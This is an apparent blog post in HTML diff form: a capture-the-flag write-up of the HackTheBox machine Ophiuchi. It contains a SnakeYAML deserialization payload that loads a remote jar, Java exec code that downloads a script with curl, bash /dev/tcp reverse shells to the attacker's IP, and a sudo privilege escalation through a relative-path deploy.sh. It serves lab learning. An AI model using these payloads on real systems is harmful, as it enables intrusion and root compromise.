@@ -1,0 +1,313 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Hackthebox Ophiuchi // Itarow</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.68.3" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Itarow" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://itarow.github.io/css/main.min.93a6fb3f59f8b73cc421a59ee5368eba507d50e7ffacf0723c82b2d680307f27.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hackthebox Ophiuchi"/>
+<meta name="twitter:description" content="I rooted Ophiuchi which was a medium Linux machine. It implicates a flaw with YAML which allow to RCE. Apache tomcat credentials free, and a sudo capability to run a go file.
+Foothold classic nmap :
+➜ Ophiuchi nmap -A -p- -T4 10.10.10.227 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 8080/tcp open http Apache Tomcat 9.0.38 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Parse YAML Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel So we are going to see the HTTP port."/>
+
+    <meta property="og:title" content="Hackthebox Ophiuchi" />
+<meta property="og:description" content="I rooted Ophiuchi which was a medium Linux machine. It implicates a flaw with YAML which allow to RCE. Apache tomcat credentials free, and a sudo capability to run a go file.
+Foothold classic nmap :
+➜ Ophiuchi nmap -A -p- -T4 10.10.10.227 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 8080/tcp open http Apache Tomcat 9.0.38 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Parse YAML Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel So we are going to see the HTTP port." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://itarow.github.io/posts/hackthebox-ophiuchi/" />
+<meta property="article:published_time" content="2021-06-25T16:22:28+02:00" />
+<meta property="article:modified_time" content="2021-06-25T16:22:28+02:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://itarow.github.io"><img class="app-header-avatar" src="/avatar.jpg" alt="Itarow" /></a>
+      <h1>Itarow</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/home/Itarow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags">/tags</a>
+      </nav>
+      <p>CS student, wrtiting some write up of cool CTF&#39;s challenges and box</p>
+      <div class="app-header-social">
+        
+          <a href="https://www.root-me.org/Itarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-flag">
+  <title>Root-me</title>
+  <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/0xItarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://github.com/itarow" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://app.hackthebox.eu/profile/409940" target="_blank" rel="noreferrer noopener">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-terminal">
+  <title>HackTheBox</title>
+  <polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Hackthebox Ophiuchi</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jun 25, 2021
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://itarow.github.io/tags/hackthebox/">HackTheBox</a>
+              <a class="tag" href="https://itarow.github.io/tags/write-up/">Write-up</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>I rooted Ophiuchi which was a medium Linux machine. It implicates a flaw with YAML which allow to RCE. Apache tomcat credentials free, and a sudo capability to run a go file.</p>
+<h2 id="foothold">Foothold</h2>
+<p>classic nmap :</p>
+<pre><code>➜  Ophiuchi nmap -A -p- -T4 10.10.10.227      
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>So we are going to see the HTTP port.
+<img src="../img/ophiuchi/img1.png" alt=""></p>
+<p>So we see a YAML Parser, after few search on the web, we see that it is possible to get RCE with this functionnality. (<a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858</a>)</p>
+<p>First, to confirm this, we could try this payload, and see if we can get a connection back :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [
+  <span style="color:#75715e">!!java.net.URLClassLoader</span> [[
+    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://10.10.14.84:8000/&#34;</span>]
+  ]]
+]
+</code></pre></div><pre><code>$python3 -m http.server
+
+10.10.10.227 - - [04/Apr/2021 16:41:49] code 404, message File not found
+10.10.10.227 - - [04/Apr/2021 16:41:49] &quot;HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1&quot; 404 -
+</code></pre><p>Yes, we get a ping back, so we are on the right way.</p>
+<p>Now, we are gonna use this GitHub to get RCE (<a href="https://github.com/artsploit/yaml-payload)">https://github.com/artsploit/yaml-payload)</a>.</p>
+<p><img src="../img/ophiuchi/img2.png" alt=""></p>
+<p>We need to alter <code>Runtime().exec(&quot; … &quot;);</code></p>
+<p>Compile with :</p>
+<pre><code>$javac src/artsploit/AwesomeScriptEngineFactory.java
+$jar -cvf yaml-payload.jar -C src/ .
+</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#75715e">!!javax.script.ScriptEngineManager</span> [
+  <span style="color:#75715e">!!java.net.URLClassLoader</span> [[
+    <span style="color:#75715e">!!java.net.URL</span> [<span style="color:#e6db74">&#34;http://10.10.14.84:8000/yaml-payload.jar&#34;</span>]
+  ]]
+]
+</code></pre></div><p>We listen with python http server and it works, I tried to ping another http server and I get a connection.
+So now, reverse shell part, which was annoying.
+After many tried, the solution, was to upload a script .sh on /tmp , put a reverse shell bash command in it :</p>
+<p><code>bash -i &gt;&amp; /dev/tcp/10.10.14.84/8888 0&gt;&amp;1</code></p>
+<p>And execute the script whith bash /tmp/rev.sh for example like this :</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#a6e22e">AwesomeScriptEngineFactory</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+        <span style="color:#75715e">//Runtime.getRuntime().exec(&#34;curl http://10.10.14.193:8887/rev.sh -o /tmp/rev.sh&#34;);
+</span><span style="color:#75715e"></span>        Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;bash /tmp/rev.sh&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>IOException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+    <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>So yes :</p>
+<pre><code>$nc -lvnp 8888
+Connection from 10.10.10.227:46760
+bash: cannot set terminal process group (794): Inappropriate ioctl for device
+bash: no job control in this shell
+tomcat@ophiuchi:/$ id
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+</code></pre><h2 id="user">User</h2>
+<p>So classic move -&gt; run linPeas.sh.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">[+] Searching Tomcat users file
+tomcat-users.xml file found: /usr/src/linux-headers-5.4.0-51/scripts/kconfig/tests/no_write_if_dep_unmet/config\n/opt/tomcat/conf/tomcat-users.xml
+<span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;whythereisalimit&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;manager-gui,admin-gui&#34;</span><span style="color:#f92672">/&gt;</span>
+  <span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;tomcat&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;tomcat&#34;</span><span style="color:#f92672">/&gt;</span>
+  <span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;both&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;tomcat,role1&#34;</span><span style="color:#f92672">/&gt;</span>
+  <span style="color:#f92672">&lt;user</span> <span style="color:#a6e22e">username=</span><span style="color:#e6db74">&#34;role1&#34;</span> <span style="color:#a6e22e">password=</span><span style="color:#e6db74">&#34;&lt;must-be-changed&gt;&#34;</span> <span style="color:#a6e22e">roles=</span><span style="color:#e6db74">&#34;role1&#34;</span><span style="color:#f92672">/&gt;</span>
+</code></pre></div><p>It found tomcat-users.xml file, which contain admin password. We try to log in with ssh :</p>
+<pre><code>$ssh admin@10.10.10.227
+admin@ophiuchi:~$ id
+uid=1000(admin) gid=1000(admin) groups=1000(admin)
+</code></pre><h2 id="privesc">PrivEsc</h2>
+<p>Now, root part, which was extremely cool.
+Classic sudo -l :</p>
+<pre><code>admin@ophiuchi:/tmp$ sudo -l
+Matching Defaults entries for admin on ophiuchi:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User admin may run the following commands on ophiuchi:
+    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
+</code></pre><pre><code>admin@ophiuchi:/tmp$ ls /opt/wasm-functions/
+backup  deploy.sh  index  index.go  main.wasm
+admin@ophiuchi:/tmp$ cat /opt/wasm-functions/index.go
+</code></pre><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+
+<span style="color:#f92672">import</span> (
+	<span style="color:#e6db74">&#34;fmt&#34;</span>
+	<span style="color:#a6e22e">wasm</span> <span style="color:#e6db74">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
+	<span style="color:#e6db74">&#34;os/exec&#34;</span>
+	<span style="color:#e6db74">&#34;log&#34;</span>
+)
+
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+	<span style="color:#a6e22e">bytes</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">ReadBytes</span>(<span style="color:#e6db74">&#34;main.wasm&#34;</span>)
+
+	<span style="color:#a6e22e">instance</span>, <span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">NewInstance</span>(<span style="color:#a6e22e">bytes</span>)
+	<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">Close</span>()
+	<span style="color:#a6e22e">init</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">Exports</span>[<span style="color:#e6db74">&#34;info&#34;</span>]
+	<span style="color:#a6e22e">result</span>,<span style="color:#a6e22e">_</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">init</span>()
+	<span style="color:#a6e22e">f</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">result</span>.<span style="color:#a6e22e">String</span>()
+	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">f</span> <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;1&#34;</span>) {
+		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Not ready to deploy&#34;</span>)
+	} <span style="color:#66d9ef">else</span> {
+		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#e6db74">&#34;Ready to deploy&#34;</span>)
+		<span style="color:#a6e22e">out</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, <span style="color:#e6db74">&#34;deploy.sh&#34;</span>).<span style="color:#a6e22e">Output</span>()
+		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">Fatal</span>(<span style="color:#a6e22e">err</span>)
+		}
+		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(string(<span style="color:#a6e22e">out</span>))
+	}
+}
+</code></pre></div><p>So, we could run index.go with sudo. This file is going to read main.wasm file, and if the return of main.wasm is different than 1, it says “Not ready to deploy”, and if not, “Ready to deploy” and execute a script named deploy.sh.
+The flaw here, is the path of main.wasm and deploy.sh are not specified, so we could modify these 2 files, in another path, and run the index.go. It’s gonna look at the files which are on the path when we run the script.
+When we run the script in the /opt/wasm-functions/ , it says “Not ready to deploy”, so the script, main.wasm, isn’t returning 1, but we need it, to execute deploy.sh
+So now, editing part of the main.wasm file, to do this, we are going to use this github repository (<a href="https://github.com/WebAssembly/wabt)">https://github.com/WebAssembly/wabt)</a>.</p>
+<pre><code>$bin/wasm-decompile ../main.wasm  -o ../main.dcmp      
+$cat ../main.dcmp
+export memory memory(initial: 16, max: 0);
+
+global g_a:int = 1048576;
+export global data_end:int = 1048576;
+export global heap_base:int = 1048576;
+
+table T_a:funcref(min: 1, max: 1);
+
+export function info():int {
+  return 0
+}
+➜  wabt git:(main) bin/wasm-interp ../main.wasm --run-all-exports                          
+info() =&gt; i32:0
+</code></pre><p>We see that the script return 0. And our goal is to return 1.
+We converter the .wasm into .wat to modify it :</p>
+<pre><code>$bin/wasm2wat ../main.wasm -o ../test.wat
+$cat test.wat
+(module
+  (type (;0;) (func (result i32)))
+  (func $info (type 0) (result i32)
+    i32.const 0)
+  (table (;0;) 1 1 funcref)
+  (memory (;0;) 16)
+  (global (;0;) (mut i32) (i32.const 1048576))
+  (global (;1;) i32 (i32.const 1048576))
+  (global (;2;) i32 (i32.const 1048576))
+  (export &quot;memory&quot; (memory 0))
+  (export &quot;info&quot; (func $info))
+  (export &quot;__data_end&quot; (global 1))
+  (export &quot;__heap_base&quot; (global 2)))
+</code></pre><p>We see that i32.const is set at 0, we change the value to 1. Now we convert this .wat to .wasm and decompile it :</p>
+<pre><code>$bin/wat2wasm ../test.wat -o ../test.main
+$bin/wasm-interp ../test.main --run-all-exports
+info() =&gt; i32:1
+➜  wabt git:(main) bin/wasm-decompile ../test.main                 
+export memory memory(initial: 16, max: 0);
+
+global g_a:int = 1048576;
+export global data_end:int = 1048576;
+export global heap_base:int = 1048576;
+
+table T_a:funcref(min: 1, max: 1);
+
+export function info():int {
+  return 1
+}
+</code></pre><p>Here, we checked that the script return 1.
+Now we are going to upload it to the box. Also, we set up a deploy.sh script, to execute the command with sudo rights.</p>
+<pre><code>admin@ophiuchi:/tmp/test$ ls
+deploy.sh  main.wasm
+admin@ophiuchi:/tmp/test$ cat deploy.sh
+#!/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+id
+admin@ophiuchi:/tmp/test$ chmod 777 deploy.sh
+admin@ophiuchi:/tmp/test$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><pre><code>admin@ophiuchi:/tmp/test$ cat rev.sh
+#!/bin/bash
+echo &quot;pwn :D&quot;
+bash -i &gt;&amp; /dev/tcp/10.10.14.84/8888 0&gt;&amp;1
+admin@ophiuchi:/tmp/test$ cat deploy.sh
+#!/bin/bash
+
+# ToDo
+# Create script to automatic deploy our new web at tomcat port 8080
+bash /tmp/test/rev.sh
+</code></pre><p>So, we just created a simple reverse shell command in another bash script.
+Setup netcat listener, and execute the index.go script.</p>
+<pre><code>admin@ophiuchi:/tmp/test$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+
+-----------------
+
+➜  Ophiuchi nc -lvnp 8888
+Connection from 10.10.10.227:46738
+root@ophiuchi:/tmp/test# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><p>So yesss, we are root, hope you enjoyed this write-up, in my side, I really like this box, which implicate new knowledge, especially for the root part :).</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
